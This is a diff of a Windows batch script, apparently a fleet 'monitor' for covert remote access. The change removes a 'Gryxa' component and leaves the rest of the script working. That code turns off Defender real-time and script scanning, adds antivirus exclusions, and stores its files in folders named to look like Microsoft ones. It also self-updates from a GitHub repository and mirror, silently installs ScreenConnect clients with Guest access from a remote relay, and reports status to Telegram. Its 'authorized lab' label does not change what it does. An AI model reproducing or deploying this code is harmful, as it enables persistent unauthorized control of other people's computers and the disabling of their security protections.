@@ -1,38 +1,17 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M69
-rem  M69: GIT_PIN=main always pulls tip every tick (restore force-update-to-latest).
-rem  M68: PUSH-CLEAN exception under NO_INSTALL — one clean uninstall+install+reboot per host (gryxa_clean_install).
-rem  M67: NO_INSTALL freeze — no auto msiexec/HEAL/REINSTALL/PUSH-START; watcher stays ON.
-rem  M66: NEVER sc stop Gryxa on force (M64 bounce left 60+ Stopped when Guest killed mon mid-tick).
-rem       PUSH-START/RECONNECT = detached start-only; Stopped → multi-start no HEAL.
-rem  M65: never bypass HEAL rate-limit on 1060; keep gryxa_msi.lock (no delete before queue) — stops panel dupes.
-rem  M64: PUSH-RECONNECT under OBSERVE — bounce Gryxa / HEAL 1060; never clear watcher; no REINSTALL.
-rem  M63: OBSERVE still blocks REINSTALL;/x — allows HEAL start + 1060 /i (G10).
-rem  M62: QueueGryxaHeal hard-blocked under OBSERVE; pair with G10 (no shared ProductCode /x).
-rem  M61: arm gryxa_watch LOOP — record all Gryxa interference; Telegram on DROP with CAUSE.
-rem  M60: OBSERVE mode — no heal/force/reinstall; log health to drop_trace.log (prove drop cause).
-rem  M59: stop drop+reinstall — clear force SKIP if healthy; HEAL/Ensure 1060-only; G9 never /x on HEAL.
-rem  M58: sticky version_floor.cfg — once updated, never apply/run older mon/lib/gryxa again.
-rem  M57: fleet_channel.cfg pin+floor; cmd-first Gryxa health (ignore AMSI garbage); no downgrade.
-rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
-rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
-rem  M50: hash-mismatch → BUILD fallback (unstick CDN-stale main).
-rem  M49: FREEZE - no auto Gryxa msiexec from mon; start-only; manual force only.
-rem  M48: HANDS-OFF all SC interrupt — only Gryxa install-if-absent. No exterminate/sevrz /i/sc delete.
-rem  M47: HARD stop Gryxa interrupts — no raw sevrz /i; detect any non-sevrz SC; adopt live FP.
-rem  M46: START_PENDING = alive; never /x Gryxa while service exists (connect-drop).
-rem  M45: L42 safe FP migrate (install new before removing old Gryxa).
-rem  M44: force_gryxa.flag must NOT /x live Gryxa (L41 force-skip-if-running).
-rem  M43: AMSI-proof Gryxa fallback via own_gryxa.cmd (pure msiexec) when PS blocked/missing.
-rem  M42: signed manifest; sevrz.cfg; sibling-safe sevrz /i.
+rem  OWN_MON  BUILD 20260804M70
+rem  M70: Gryxa stack removed — sevrz-only monitor/heal/TG/self-update.
+rem  M69: GIT_PIN=main always pulls tip every tick.
+rem  M58: sticky version_floor.cfg — never apply older mon/lib.
+rem  M57: fleet_channel.cfg pin+floor; no downgrade.
+rem  M50: hash-mismatch → BUILD fallback.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
 
 set "KEEP_FP=5f6010579852e507"
 set "ALT_FP=f861c8140d453427"
-set "GRYXA_FP=36e506ff016b2151"
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\own_mon.log"
@@ -47,22 +26,15 @@ set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.
 set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%RANDOM%%RANDOM%"
 set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
 set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
-set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
-set "OWNGRYXA2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
-set "OWNWATCH=https://raw.githubusercontent.com/xnobuddy/github-drop/main/gryxa_watch.cmd?t=%RANDOM%%RANDOM%"
-set "OWNWATCH2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/gryxa_watch.cmd?t=%RANDOM%%RANDOM%"
 set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest?t=%RANDOM%%RANDOM%"
 set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest.sig?t=%RANDOM%%RANDOM%"
 set "SEVRZ_EXP_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/sevrz_expected.cfg?t=%RANDOM%%RANDOM%"
 set "SEVRZ_EXP_URL2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/sevrz_expected.cfg?t=%RANDOM%%RANDOM%"
 set "MSI_URL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
-set "MSI_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
 set "MSI_PKG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg.msi"
 set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
 set "MSICACHE=%WD%\pkg.msi"
-set "MSI_G=%ProgramData%\ScreenConnect.Gryxa.msi"
-set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 
 if not exist "%WD%" md "%WD%" 2>nul
 rem M56: AMSI exclusions FIRST (before any powershell) — AV was wiping lib and forcing M36 fallback
@@ -75,28 +47,22 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M69"
-set "MON_MIN=M62"
+set "MONVER=M70"
+set "MON_MIN=M70"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "FLOOR_FILE=%WD%\version_floor.cfg"
 set "MON_FLOOR=0"
 set "LIB_FLOOR=0"
-set "GRYXA_FLOOR=0"
 set "PF86=%ProgramFiles(x86)%"
-set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
-rem load current Gryxa FP (may rotate when server/keys change)
-if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
-if not defined GRYXA_FP set "GRYXA_FP=36e506ff016b2151"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
 echo ── tick !DT! [ver %MONVER%] ──>>"%LOG%"
 
-rem M58: sticky version_floor.cfg — once raised, never apply older mon/lib/gryxa
+rem M58: sticky version_floor.cfg — once raised, never apply older mon/lib
 if exist "%FLOOR_FILE%" for /f "usebackq tokens=1,* delims==" %%K in ("%FLOOR_FILE%") do (
   if /I "%%K"=="MON_FLOOR" set "MON_FLOOR=%%L"
   if /I "%%K"=="LIB_FLOOR" set "LIB_FLOOR=%%L"
-  if /I "%%K"=="GRYXA_FLOOR" set "GRYXA_FLOOR=%%L"
 )
 set /a _CURM=%MONVER:M=% 2>nul
 if not defined _CURM set "_CURM=0"
@@ -104,10 +70,6 @@ if !_CURM! GTR !MON_FLOOR! set "MON_FLOOR=!_CURM!"
 if exist "%WD%\own_lib.ps1" (
   call :ParseLibNum "%WD%\own_lib.ps1"
   if !_PN! GTR !LIB_FLOOR! set "LIB_FLOOR=!_PN!"
-)
-if exist "%WD%\own_gryxa.cmd" (
-  call :ParseGryxaNum "%WD%\own_gryxa.cmd"
-  if !_PN! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_PN!"
 )
 call :SaveFloor
 set "COUNT=0"
@@ -153,7 +115,6 @@ if exist "%STAGE%\fleet_channel.cfg" (
   for /f "usebackq tokens=1,* delims==" %%K in ("%STAGE%\fleet_channel.cfg") do (
     if /I "%%K"=="MON_MIN" set "MON_MIN=%%L"
     if /I "%%K"=="LIB_MIN" set "LIB_MIN=%%L"
-    if /I "%%K"=="GRYXA_MIN" set "GRYXA_MIN=%%L"
     if /I "%%K"=="GIT_PIN" set "GIT_PIN=%%L"
   )
   if defined MON_MIN (
@@ -164,32 +125,24 @@ if exist "%STAGE%\fleet_channel.cfg" (
     set "_CL=!LIB_MIN:L=!"
     if !_CL! GTR !LIB_FLOOR! set "LIB_FLOOR=!_CL!"
   )
-  if defined GRYXA_MIN (
-    set "_CG=!GRYXA_MIN:G=!"
-    if !_CG! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_CG!"
-  )
   call :SaveFloor
   rem M69: GIT_PIN=main (or empty) → always tip; only non-main pins override URLs
   if defined GIT_PIN if /I not "!GIT_PIN!"=="main" if not "!GIT_PIN!"=="" (
     set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_mon.cmd?t=%RANDOM%%RANDOM%"
     set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_lib.ps1?t=%RANDOM%%RANDOM%"
-    set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
-    set "OWNWATCH=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/gryxa_watch.cmd?t=%RANDOM%%RANDOM%"
     set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_secure.cmd?t=%RANDOM%%RANDOM%"
     set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest?t=%RANDOM%%RANDOM%"
     set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest.sig?t=%RANDOM%%RANDOM%"
-    echo channel_pin=!GIT_PIN! mon_min=!MON_MIN! lib_min=!LIB_MIN! gryxa_min=!GRYXA_MIN!>>"%LOG%"
+    echo channel_pin=!GIT_PIN! mon_min=!MON_MIN! lib_min=!LIB_MIN!>>"%LOG%"
   ) else (
     set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd?t=%RANDOM%%RANDOM%"
     set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
-    set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
-    set "OWNWATCH=https://raw.githubusercontent.com/xnobuddy/github-drop/main/gryxa_watch.cmd?t=%RANDOM%%RANDOM%"
     set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd?t=%RANDOM%%RANDOM%"
     set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest?t=%RANDOM%%RANDOM%"
     set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest.sig?t=%RANDOM%%RANDOM%"
-    echo channel_pin=main mon_min=!MON_MIN! lib_min=!LIB_MIN! gryxa_min=!GRYXA_MIN! always_tip=1>>"%LOG%"
+    echo channel_pin=main mon_min=!MON_MIN! lib_min=!LIB_MIN! always_tip=1>>"%LOG%"
   )
-  echo floor mon=!MON_FLOOR! lib=!LIB_FLOOR! gryxa=!GRYXA_FLOOR!>>"%LOG%"
+  echo floor mon=!MON_FLOOR! lib=!LIB_FLOOR!>>"%LOG%"
   copy /y "%STAGE%\fleet_channel.cfg" "%WD%\fleet_channel.cfg" >nul 2>&1
 )
 attrib -h -s -r "%WD%" >nul 2>&1
@@ -207,10 +160,6 @@ if not exist "%STAGE%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time
 if not exist "%STAGE%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.new" "%OWNLIB2%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON%" >nul 2>&1
 if not exist "%STAGE%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON2%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA%" >nul 2>&1
-if not exist "%STAGE%\own_gryxa.new" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA2%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%STAGE%\gryxa_watch.new" "%OWNWATCH%" >nul 2>&1
-if not exist "%STAGE%\gryxa_watch.new" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%STAGE%\gryxa_watch.new" "%OWNWATCH2%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest" "%MANIFEST_URL%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest.sig" "%MANIFEST_SIG_URL%" >nul 2>&1
 
@@ -221,8 +170,6 @@ if exist "%STAGE%\own_lib.new" set "MAP=!MAP!own_lib.ps1=%STAGE%\own_lib.new;"
 if exist "%STAGE%\own_mon.next" set "MAP=!MAP!own_mon.cmd=%STAGE%\own_mon.next;"
 if exist "%STAGE%\own_secure.new" set "MAP=!MAP!own_secure.cmd=%STAGE%\own_secure.new;"
 if exist "%STAGE%\tg_report.new" set "MAP=!MAP!tg_report.ps1=%STAGE%\tg_report.new;"
-if exist "%STAGE%\own_gryxa.new" set "MAP=!MAP!own_gryxa.cmd=%STAGE%\own_gryxa.new;"
-if exist "%STAGE%\gryxa_watch.new" set "MAP=!MAP!gryxa_watch.cmd=%STAGE%\gryxa_watch.new;"
 set "VRES=missing"
 if exist "%WD%\own_lib.ps1" if exist "%STAGE%\update.manifest" if exist "%STAGE%\update.manifest.sig" if defined MAP (
   for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action verify-update -WorkDir "%WD%" -Extra "%STAGE%\update.manifest|%STAGE%\update.manifest.sig|!MAP!"`) do set "VRES=%%R"
@@ -258,24 +205,6 @@ if /I "!UPD_OK!"=="1" (
       if !_PN! GTR !LIB_FLOOR! set "LIB_FLOOR=!_PN!"
     )
   )
-  if exist "%STAGE%\own_gryxa.new" (
-    findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1
-    if not errorlevel 1 (
-      call :RefuseIfGryxaBelowFloor "%STAGE%\own_gryxa.new"
-      if errorlevel 1 (
-        echo gryxa_downgrade_blocked floor=!GRYXA_FLOOR!>>"%LOG%"
-        del /f /q "%STAGE%\own_gryxa.new" >nul 2>&1
-      ) else (
-        move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
-        call :ParseGryxaNum "%WD%\own_gryxa.cmd"
-        if !_PN! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_PN!"
-      )
-    )
-  )
-  if exist "%STAGE%\gryxa_watch.new" (
-    findstr /C:"GRYXA_WATCH BUILD" "%STAGE%\gryxa_watch.new" >nul 2>&1
-    if not errorlevel 1 move /y "%STAGE%\gryxa_watch.new" "%WD%\gryxa_watch.cmd" >nul 2>&1
-  )
   set "SELF_UPD=0"
   if exist "%STAGE%\own_mon.next" (
     fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
@@ -299,24 +228,6 @@ if /I "!UPD_OK!"=="1" (
       )
     )
   )
-  if exist "%STAGE%\own_gryxa.new" (
-    findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1
-    if not errorlevel 1 for %%F in ("%STAGE%\own_gryxa.new") do if %%~zF GTR 500 (
-      call :RefuseIfGryxaBelowFloor "%STAGE%\own_gryxa.new"
-      if errorlevel 1 (
-        echo gryxa_downgrade_blocked floor=!GRYXA_FLOOR!>>"%LOG%"
-        del /f /q "%STAGE%\own_gryxa.new" >nul 2>&1
-      ) else (
-        move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
-        call :ParseGryxaNum "%WD%\own_gryxa.cmd"
-        if !_PN! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_PN!"
-      )
-    )
-  )
-  if exist "%STAGE%\gryxa_watch.new" (
-    findstr /C:"GRYXA_WATCH BUILD" "%STAGE%\gryxa_watch.new" >nul 2>&1
-    if not errorlevel 1 for %%F in ("%STAGE%\gryxa_watch.new") do if %%~zF GTR 800 move /y "%STAGE%\gryxa_watch.new" "%WD%\gryxa_watch.cmd" >nul 2>&1
-  )
   set "SELF_UPD=0"
   findstr /C:"OWN_MON  BUILD" "%STAGE%\own_mon.next" >nul 2>&1
   if not errorlevel 1 for %%F in ("%STAGE%\own_mon.next") do if %%~zF GTR 1500 (
@@ -325,7 +236,7 @@ if /I "!UPD_OK!"=="1" (
   )
   if "%SELF_UPD%"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
 ) else (
-  del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" "%STAGE%\own_gryxa.new" "%STAGE%\gryxa_watch.new" >nul 2>&1
+  del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" >nul 2>&1
   set "SELF_UPD=0"
 )
 call :SaveFloor
@@ -340,32 +251,13 @@ if "!SELF_UPD!"=="1" if exist "%STAGE%\own_mon.next" (
   )
 )
 
-del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_gryxa.new" "%STAGE%\gryxa_watch.new" >nul 2>&1
+del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" >nul 2>&1
 del /f /q "%STAGE%\update.manifest" "%STAGE%\update.manifest.sig" >nul 2>&1
-
-rem M61: ensure Gryxa drop watcher is present + looping
-call :EnsureGryxaWatch
 
 rem M43: if lib still missing (AMSI wiped it / never landed), keep a TEMP copy for fallbacks
 if not exist "%WD%\own_lib.ps1" if exist "%STAGE%\own_lib.new" (
   call :RefuseIfLibBelowFloor "%STAGE%\own_lib.new"
   if not errorlevel 1 copy /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
-)
-if not exist "%WD%\own_gryxa.cmd" (
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA%" >nul 2>&1
-  if not exist "%STAGE%\own_gryxa.new" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA2%" >nul 2>&1
-  if exist "%STAGE%\own_gryxa.new" (
-    call :RefuseIfGryxaBelowFloor "%STAGE%\own_gryxa.new"
-    if errorlevel 1 (
-      echo gryxa_bootstrap_refused_downgrade>>"%LOG%"
-      del /f /q "%STAGE%\own_gryxa.new" >nul 2>&1
-    ) else (
-      move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
-      call :ParseGryxaNum "%WD%\own_gryxa.cmd"
-      if !_PN! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_PN!"
-      call :SaveFloor
-    )
-  )
 )
 
 rem M42: sevrz.cfg dynamic FP from repo sevrz_expected.cfg
@@ -411,28 +303,15 @@ if exist "%WD%\own_lib.ps1" (
   if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
 )
 
-rem ── [E0] sync Gryxa FP from verified gryxa.com SC BEFORE exterminate ──
-if exist "%WD%\own_lib.ps1" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action sync-gryxa-fp -WorkDir "%WD%" >nul 2>&1
-  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
-)
-
 rem ── [E] L45/M48 HANDS-OFF: skip exterminate (do not touch any ScreenConnect) ──
 echo hands_off_skip_exterminate>>"%LOG%"
 set "FOREIGN_LEFT=0"
 for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
   set "FP=%%a"
   set "FP=!FP: =!"
-  rem friendly if keeper FP OR gryxa-relay (ImagePath has gryxa.com) — never count new Gryxa as foreign
   set "FRIENDLY=0"
   if /I "!FP!"=="%KEEP_FP%" set "FRIENDLY=1"
   if /I "!FP!"=="%ALT_FP%" set "FRIENDLY=1"
-  if /I "!FP!"=="%GRYXA_FP%" set "FRIENDLY=1"
-  if "!FRIENDLY!"=="0" (
-    for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
-      echo %%I | findstr /I "gryxa.com" >nul && set "FRIENDLY=1"
-    )
-  )
   if "!FRIENDLY!"=="0" (
     set /a COUNT+=1
     set /a FOREIGN_LEFT+=1
@@ -504,48 +383,20 @@ if not errorlevel 1 (
   set "PRIM_OK=1"
   goto :AfterHeal
 )
-rem refuse fresh /i if product still registered - Upgrade table can wipe ALT/GRYXA
+rem refuse fresh /i if product still registered - Upgrade table can wipe ALT sibling
 set "REGSTATE=unknown"
 if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
 if /I "!REGSTATE!"=="yes" (
   echo primary_registered_skip_fresh_install>>"%LOG%"
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "registered-stuck" >nul 2>&1
-  call :TgState DOWN "Primary registered but service missing - /fa failed; refused /i to protect ALT/GRYXA"
+  call :TgState DOWN "Primary registered but service missing - /fa failed; refused /i to protect ALT"
   goto :AfterHeal
 )
-rem O37: refuse sevrz /i when gryxa already present — shared legacy UpgradeCodes
-rem {0C94448B}/{1F85D7FE} make sibling msiexec /i knock Gryxa OFFLINE in panel.
-rem M36: detect Gryxa by relay domain too (any running gryxa.com SC), not only by FP.
-set "GREG=unknown"
-if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
-sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-if not errorlevel 1 set "GREG=yes"
-sc query "ScreenConnect Client (36e506ff016b2151)" >nul 2>&1
-if not errorlevel 1 set "GREG=yes"
-rem any non-sevrz Running/Pending SC OR ImagePath gryxa.com = Gryxa present
-for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
-  set "_FP=%%a"
-  set "_FP=!_FP: =!"
-  if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
-    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-    if not errorlevel 1 set "GREG=yes"
-  )
-  for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
-    echo %%I | findstr /I "gryxa.com" >nul && set "GREG=yes"
-  )
-)
-if /I "!GREG!"=="yes" (
-  echo primary_skip_i_protect_gryxa>>"%LOG%"
-  echo hands_off_gryxa_present_skip_sevrz>>"%LOG%"
-  call :EnsureGryxaMust
-  goto :AfterHeal
-)
-rem M48 HANDS-OFF: skip all sevrz msiexec /i / sc-family installs
-echo hands_off_skip_sevrz_msi>>"%LOG%"
-call :EnsureGryxaMust
-goto :AfterHeal
+echo primary missing - msi install ladder>>"%LOG%"
+call :InstallMsi "%MSI_PKG1%" github-pkg
+if errorlevel 1 call :InstallMsi "%MSI_PKG2%" jsdelivr-pkg
+if errorlevel 1 call :InstallMsi "%MSI_URL%" sevrz-ui
 call :RestoreAlt
-call :EnsureGryxaMust
 if "%INSTALLED%"=="0" (
   if exist "%WD%\msi_heal.log" (
     echo --- msi_heal.log tail --->>"%LOG%"
@@ -584,7 +435,7 @@ rem (extermination already ran pre-heal in [E]; foreign survivors counted there)
 
 rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
 rem M39/M43: MpPreference when WinDefend alive; always also write policy/exclusion REG
-rem (Hell host: WinDefend dead → 0x800106ba, but AMSI still blocked PS — reg + own_gryxa.cmd cover it)
+rem (Hell host: WinDefend dead → 0x800106ba, but AMSI still blocked PS — reg exclusions cover it)
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
@@ -604,332 +455,11 @@ if errorlevel 1 (
   echo done>"%WD%\sec.flag"
 )
 
-rem ── [G2] Gryxa MUST-RUN ───────────────────────────────────────
-rem O40: if ANY non-sevrz SC Running → never msiexec (stops panel duplicates).
-set "GRYXA_OK=0"
-set "GRYXA_WAS=0"
-set "DO_DEEP=0"
-set "FORCE_G=0"
-set "OBSERVE=0"
-if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
-
-rem M60/M67: observe + no_install from repo — freeze all auto install/heal/force
-set "NO_INSTALL=0"
-"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%WD%\observe.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/observe.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
-if exist "%WD%\observe.new" (
-  findstr /I /C:"OBSERVE" /C:"NO_INSTALL" "%WD%\observe.new" >nul 2>&1
-  if not errorlevel 1 (
-    set "OBSERVE=1"
-    copy /y "%WD%\observe.new" "%WD%\observe.flag" >nul 2>&1
-  ) else (
-    del /f /q "%WD%\observe.flag" >nul 2>&1
-  )
-)
-"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%WD%\no_install.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/no_install.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
-if exist "%WD%\no_install.new" (
-  findstr /I /C:"NO_INSTALL" "%WD%\no_install.new" >nul 2>&1
-  if not errorlevel 1 (
-    set "NO_INSTALL=1"
-    set "OBSERVE=1"
-    copy /y "%WD%\no_install.new" "%WD%\no_install.flag" >nul 2>&1
-  ) else (
-    del /f /q "%WD%\no_install.flag" >nul 2>&1
-  )
-)
-if exist "%WD%\observe.flag" set "OBSERVE=1"
-if exist "%WD%\no_install.flag" (
-  set "NO_INSTALL=1"
-  set "OBSERVE=1"
-)
-if "!NO_INSTALL!"=="1" echo gryxa_NO_INSTALL_freeze_no_msiexec_no_heal_no_force>>"%LOG%"
-if "!OBSERVE!"=="1" if "!NO_INSTALL!"=="0" echo gryxa_OBSERVE_mode_no_heal_no_force>>"%LOG%"
-rem rotate old gryxa uninstall evidence so diag VERDICT is not forever OUR_GRYXA_UNINSTALL
-if "!OBSERVE!"=="1" if exist "%WD%\own_gryxa.log" if not exist "%WD%\own_gryxa.log.pre_observe" (
-  move /y "%WD%\own_gryxa.log" "%WD%\own_gryxa.log.pre_observe" >nul 2>&1
-  echo gryxa_log_rotated_pre_observe>>"%LOG%"
-)
-
-rem FORCE push: content-hash via fc /b (re-fire when flag content changes); raw-first
-"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
-if not exist "%WD%\force_gryxa.new" "%CURL%" -L --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
-if exist "%WD%\force_gryxa.new" (
-  findstr /C:"PUSH" "%WD%\force_gryxa.new" >nul 2>&1
-  if not errorlevel 1 (
-    if not exist "%WD%\force_gryxa.done" (
-      set "FORCE_G=1"
-    ) else (
-      fc /b "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
